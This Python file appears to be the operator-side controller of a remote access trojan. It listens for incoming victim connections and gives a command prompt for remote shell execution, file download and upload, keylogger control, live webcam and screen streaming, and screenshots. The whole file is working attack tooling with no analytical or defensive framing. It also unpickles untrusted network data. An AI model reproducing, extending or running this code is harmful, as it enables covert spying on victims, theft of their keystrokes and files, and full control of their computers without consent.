import socket
import json
import os
import struct
import pickle
import cv2

#setup ip and port
hostIP = '192.168.1.10'
connPort = 9981
webcamPort = 9998
screenPort = 9988

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.bind((hostIP, connPort))
print('Waiting for connection...')
soc.listen(5) #set target

conn = soc.accept()
_target = conn[0]
ip = conn[1]
print(_target)
print(f'Connected to {str(ip)}')

def data_receive():
    data = ''
    while True:
        try:
            data = data + _target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(fileName):
    file = open(fileName, 'wb')
    _target.settimeout(5)
    _file = _target.recv(1024)
    while _file:
        file.write(_file)
        try:
            _file = _target.recv(1024)
        except socket.timeout as e:
            break
    _target.settimeout(None)
    file.close()

def upload_file(fileName):
    file = open(fileName, 'rb')
    _target.send(file.read())
    file.close()

def cam_record():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((hostIP, webcamPort))
    sock.listen(5) #set target
    cn = sock.accept()
    target = cn[0]
    ip = cn[1]
    print(f'Making connection to {str(ip)} webcam ...')

    byteData = b""
    payloadSize = struct.calcsize("Q")

    while True:
        while (len(byteData)) < payloadSize:
            packet = target.recv(4*1024)
            if not packet: break
            byteData += packet

        packed_msg_size = byteData[:payloadSize]
        byteData = byteData[payloadSize:]
        msg_size = struct.unpack("Q", packed_msg_size)[0]
        while len(byteData) < msg_size:
            byteData += target.recv(4*1024)
        frame_data = byteData[:msg_size]
        byteData = byteData[msg_size:]
        frame = pickle.loads(frame_data)
        cv2.imshow("Recording ...", frame)
        key = cv2.waitKey(1)
        if key == 27:
            break
    target.close()
    cv2.destroyAllWindows()

def record_screen():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((hostIP, screenPort))
    sock.listen(5) #set target
    cn = sock.accept()
    target = cn[0]
    ip = cn[1]
    print(f'Making connection to {str(ip)} screen ...')

    byteData = b""
    payloadSize = struct.calcsize("i")

    while True:
        while (len(byteData)) < payloadSize:
            packet = target.recv(1024)
            if not packet: break
            byteData += packet
            
        packed_msg_size = byteData[:payloadSize]
        byteData = byteData[payloadSize:]
        msg_size = struct.unpack("i", packed_msg_size)[0]
        while len(byteData) < msg_size:
            byteData += target.recv(1024)
        frame_data = byteData[:msg_size]
        byteData = byteData[msg_size:]
        frame = pickle.loads(frame_data)
        cv2.imshow("Recording screen...", frame)
        key = cv2.waitKey(1)
        if key == 27:
            break
    target.close()
    cv2.destroyAllWindows()

        
def shell_communication():
    n = 0
    while True:
        cmd = input('OJAN>> ')
        data = json.dumps(cmd)
        _target.send(data.encode())
        if cmd in ('exit', 'quit'):
            break
        elif cmd == 'clear':
            os.system('clear')
        elif cmd[:3] == 'cd ':
            pass
        elif cmd[:8] == 'download':
            download_file(cmd[9:])
        elif cmd[:6] == 'upload':
            upload_file(cmd[7:])
        elif cmd == 'kaylog':
            pass
        elif cmd == 'readlogger':
            data = _target.recv(1024).decode()
            print(data)
        elif cmd == 'stoplogger':
            pass
        elif cmd == 'startcam':
            cam_record()
        elif cmd == 'screenshot':
            n += 1
            file = open("ss"+str(n)+".png", 'wb')
            _target.settimeout(5)
            _file = _target.recv(1024)
            while _file:
                file.write(_file)
                try:
                    _file = _target.recv(1024)
                except socket.timeout as e:
                    break
            _target.settimeout(None)
            file.close()
        elif cmd == 'sharescreen':
            record_screen()
        else:
            result = data_receive()
            print(result)
    
shell_communication()